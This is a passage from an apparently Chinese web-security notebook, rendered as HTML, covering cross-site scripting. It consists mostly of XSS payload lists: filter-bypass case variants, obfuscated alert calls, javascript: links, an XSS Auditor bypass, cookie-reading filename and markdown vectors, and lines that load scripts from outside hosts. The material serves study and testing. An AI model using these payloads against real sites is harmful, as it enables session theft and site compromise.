cm-bracket">&lt;/</span><span class="cm-tag">head</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">body</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">script</span> <span class="cm-attribute">type</span>=<span class="cm-string">"text/javascript"</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">var</span> <span class="cm-def">d</span><span class="cm-operator">=</span> <span class="cm-variable">atob</span>(<span class="cm-string">'&lt;?php echo $msg; ?&gt;'</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">var</span> <span class="cm-def">cleanvar</span> <span class="cm-operator">=</span> <span class="cm-variable">DOMPurify</span>.<span class="cm-property">sanitize</span>(<span class="cm-variable">d</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">document</span>.<span class="cm-property">write</span>(<span class="cm-variable">cleanvar</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">15</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">script</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">16</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">body</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">17</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">html</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 385px;"></div><div class="CodeMirror-gutters" style="height: 385px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>4</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">// payload</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&lt;</span><span class="cm-variable">div</span> <span class="cm-variable">data</span><span class="cm-operator">-</span><span class="cm-variable">role</span><span class="cm-operator">=</span><span class="cm-variable">popup</span> <span class="cm-variable">id</span><span class="cm-operator">=</span><span class="cm-string">'--&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;'</span><span class="cm-operator">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&lt;/</span><span class="cm-variable">div</span><span class="cm-operator">&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 91px;"></div><div class="CodeMirror-gutters" style="height: 91px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre></blockquote><h4 id='rporelative-path-overwrite'><span>RPO(Relative Path Overwrite)</span></h4><blockquote><p><span>RPO(Relative Path Overwrite) 攻击又称为相对路径覆盖攻击，依赖于浏览器和网络服务器的反应，利用服务器的 Web 缓存技术和配置差异。</span></p></blockquote><h3 id='4210--payload'><span>4.2.10  Payload</span></h3><h4 id='常用-1'><span>常用</span></h4><ul><li><span>&lt;</span><span>script</span><span>&gt;</span><span>alert(/xss/)</span><span>&lt;</span><span>/script</span><span>&gt;</span></li><li><span>&lt;</span><span>svg onload=alert(document.domain)</span><span>&gt;</span></li><li><span>&lt;</span><span>img src=document.domain onerror=alert(document.domain)</span><span>&gt;</span></li><li><span>&lt;</span><span>M onmouseover=alert(document.domain)</span><span>&gt;</span><span>M</span></li><li><span>&lt;</span><span>marquee onscroll=alert(document.domain)</span><span>&gt;</span></li><li><span>&lt;</span><span>a href=javascript:alert(document.domain)</span><span>&gt;</span><span>M</span><span>&lt;</span><span>/a</span><span>&gt;</span></li><li><span>&lt;</span><span>body onload=alert(document.domain)</span><span>&gt;</span></li><li><span>&lt;</span><span>details open ontoggle=alert(document.domain)</span><span>&gt;</span></li><li><span>&lt;</span><span>embed src=javascript:alert(document.domain)</span><span>&gt;</span></li></ul><h4 id='大小写绕过'><span>大小写绕过</span></h4><ul><li><span>&lt;</span><span>script</span><span>&gt;</span><span>alert(1)</span><span>&lt;</span><span>/script</span><span>&gt;</span></li><li><span>&lt;</span><span>sCrIpT</span><span>&gt;</span><span>alert(1)</span><span>&lt;</span><span>/sCrIpT</span><span>&gt;</span></li><li><span>&lt;</span><span>ScRiPt</span><span>&gt;</span><span>alert(1)</span><span>&lt;</span><span>/ScRiPt</span><span>&gt;</span></li><li><span>&lt;</span><span>sCrIpT</span><span>&gt;</span><span>alert(1)</span><span>&lt;</span><span>/ScRiPt</span><span>&gt;</span></li><li><span>&lt;</span><span>ScRiPt</span><span>&gt;</span><span>alert(1)</span><span>&lt;</span><span>/sCrIpT</span><span>&gt;</span></li><li><span>&lt;</span><span>img src=1 onerror=alert(1)</span><span>&gt;</span></li><li><span>&lt;</span><span>iMg src=1 oNeRrOr=alert(1)</span><span>&gt;</span></li><li><span>&lt;</span><span>ImG src=1 OnErRoR=alert(1)</span><span>&gt;</span></li><li><span>&lt;</span><span>img src=1 onerror=</span><span>&quot;</span><span>alert(</span>&quot;<span>M</span>&quot;<span>)</span><span>&quot;</span><span>&gt;</span></li><li><span>&lt;</span><span>marquee onscroll=alert(1)</span><span>&gt;</span></li><li><span>&lt;</span><span>mArQuEe OnScRoLl=alert(1)</span><span>&gt;</span></li><li><span>&lt;</span><span>MaRqUeE oNsCrOlL=alert(1)</span><span>&gt;</span></li></ul><h4 id='各种alert'><span>各种alert</span></h4><ul><li><span>&lt;</span><span>script</span><span>&gt;</span><span>alert(1)</span><span>&lt;</span><span>/script</span><span>&gt;</span></li><li><span>&lt;</span><span>script</span><span>&gt;</span><span>confirm(1)</span><span>&lt;</span><span>/script</span><span>&gt;</span></li><li><span>&lt;</span><span>script</span><span>&gt;</span><span>prompt(1)</span><span>&lt;</span><span>/script</span><span>&gt;</span></li><li><span>&lt;</span><span>script</span><span>&gt;</span><span>alert(</span><span>&#39;</span><span>1</span><span>&#39;</span><span>)</span><span>&lt;</span><span>/script</span><span>&gt;</span></li><li><span>&lt;</span><span>script</span><span>&gt;</span><span>alert(</span><span>&quot;</span><span>1</span><span>&quot;</span><span>)</span><span>&lt;</span><span>/script</span><span>&gt;</span></li><li><span>&lt;</span><span>script</span><span>&gt;</span><span>alert</span><span>`</span><span>1</span><span>`</span><span>&lt;</span><span>/script</span><span>&gt;</span></li><li><span>&lt;</span><span>script</span><span>&gt;</span><span>(alert)(1)</span><span>&lt;</span><span>/script</span><span>&gt;</span></li><li><span>&lt;</span><span>script</span><span>&gt;</span><span>a=alert,a(1)</span><span>&lt;</span><span>/script</span><span>&gt;</span></li><li><span>&lt;</span><span>script</span><span>&gt;</span><span>[</span><span>1</span><span>]</span><span>.find(alert)</span><span>&lt;</span><span>/script</span><span>&gt;</span></li><li><span>&lt;</span><span>script</span><span>&gt;</span><span>top</span><span>[</span><span>&quot;</span><span>al</span><span>&quot;</span><span>+</span><span>&quot;</span><span>ert</span><span>&quot;</span><span>]</span><span>(1)</span><span>&lt;</span><span>/script</span><span>&gt;</span></li><li><span>&lt;</span><span>script</span><span>&gt;</span><span>top</span><span>[</span><span>&quot;</span><span>a</span><span>&quot;</span><span>+</span><span>&quot;</span><span>l</span><span>&quot;</span><span>+</span><span>&quot;</span><span>e</span><span>&quot;</span><span>+</span><span>&quot;</span><span>r</span><span>&quot;</span><span>+</span><span>&quot;</span><span>t</span><span>&quot;</span><span>]</span><span>(1)</span><span>&lt;</span><span>/script</span><span>&gt;</span></li><li><span>&lt;</span><span>script</span><span>&gt;</span><span>top</span><span>[</span><span>/al/.source+/ert/.source</span><span>]</span><span>(1)</span><span>&lt;</span><span>/script</span><span>&gt;</span></li><li><span>&lt;</span><span>script</span><span>&gt;</span><span>top</span><span>[</span><span>/a/.source+/l/.source+/e/.source+/r/.source+/t/.source</span><span>]</span><span>(1)</span><span>&lt;</span><span>/script</span><span>&gt;</span></li></ul><h4 id='伪协议'><span>伪协议</span></h4><ul><li><span>&lt;</span><span>a href=javascript:/0/,alert(%22M%22)</span><span>&gt;</span><span>M</span><span>&lt;</span><span>/a</span><span>&gt;</span></li><li><span>&lt;</span><span>a href=javascript:/00/,alert(%22M%22)</span><span>&gt;</span><span>M</span><span>&lt;</span><span>/a</span><span>&gt;</span></li><li><span>&lt;</span><span>a href=javascript:/000/,alert(%22M%22)</span><span>&gt;</span><span>M</span><span>&lt;</span><span>/a</span><span>&gt;</span></li><li><span>&lt;</span><span>a href=javascript:/M/,alert(%22M%22)</span><span>&gt;</span><span>M</span><span>&lt;</span><span>/a</span><span>&gt;</span></li></ul><h4 id='chrome-xss-auditor-bypass'><span>Chrome XSS auditor bypass</span></h4><ul><li><span>?param=</span><a href='https://&amp;param=@z.exeye.io/import%20rel=import%3E' target='_blank' class='url'>https://&param=@z.exeye.io/import%20rel=import%3E</a></li><li><span>&lt;</span><span>base href=javascript:/M/</span><span>&gt;</span><span>&lt;</span><span>a href=,alert(1)</span><span>&gt;</span><span>M</span><span>&lt;</span><span>/a</span><span>&gt;</span></li><li><span>&lt;</span><span>base href=javascript:/M/</span><span>&gt;</span><span>&lt;</span><span>iframe src=,alert(1)</span><span>&gt;</span><span>&lt;</span><span>/iframe</span><span>&gt;</span></li></ul><h4 id='长度限制'><span>长度限制</span></h4><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="js"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="js"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>3</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&lt;</span><span class="cm-variable">script</span><span class="cm-operator">&gt;</span><span class="cm-variable">s</span><span class="cm-operator">+=</span><span class="cm-string">"l"</span><span class="cm-operator">&lt;</span><span class="cm-string-2">/script&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">\</span><span class="cm-meta">...</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&lt;</span><span class="cm-variable">script</span><span class="cm-operator">&gt;</span><span class="cm-variable">eval</span>(<span class="cm-variable">s</span>)<span class="cm-operator">&lt;</span><span class="cm-string-2">/script&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="height: 68px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><h4 id='jquery-sourcemappingurl'><span>jquery sourceMappingURL</span></h4><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="js"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="js"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>5</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&lt;</span><span class="cm-string-2">/textarea&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&lt;</span><span class="cm-variable">script</span><span class="cm-operator">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">var</span> <span class="cm-variable">a</span><span class="cm-operator">=</span><span class="cm-number">1</span><span class="cm-comment">//@ sourceMapping</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">URL</span><span class="cm-operator">=</span><span class="cm-comment">//xss.site</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&lt;</span><span class="cm-string-2">/script&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="height: 113px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><h4 id='图片名'><span>图片名</span></h4><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="html"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="html"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">"&gt;<span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">img</span> <span class="cm-attribute">src</span>=<span class="cm-string">x</span> <span class="cm-attribute">onerror</span>=<span class="cm-string">alert(document.cookie)</span><span class="cm-tag cm-bracket">&gt;</span>.gif</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="height: 23px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><h4 id='过期的-payload'><span>过期的 payload</span></h4><ul><li><span>src=javascript:alert 基本不可以用</span></li><li><span>css expression 特性只在旧版本 ie 可用</span></li></ul><h4 id='css-1'><span>css</span></h4><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="html"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="html"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>2</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">div</span> <span class="cm-attribute">style</span>=<span class="cm-string">"background-image:url(javascript:alert(/xss/))"</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">style</span><span class="cm-tag cm-bracket">&gt;</span><span class="cm-def">@import</span><span class="cm-string">'http://ha.ckers.org/xss.css'</span>;<span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">style</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="height: 45px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><h4 id='markdown'><span>markdown</span></h4><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="markdown"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="markdown"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>8</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-link">[a]</span><span class="cm-string">(javascript:prompt(document.cookie)</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-link">[a]</span><span class="cm-string">(j a v a s c r i p t:prompt(document.cookie)</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">,→#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">![a'"`onerror=prompt(document.cookie)]</span><span class="cm-string">(x)</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-link">[notmalicious]</span><span class="cm-string">(javascript:window.onerror=alert;throw%20document.cookie)</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-link">[a]</span><span class="cm-string">(data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">![a]</span><span 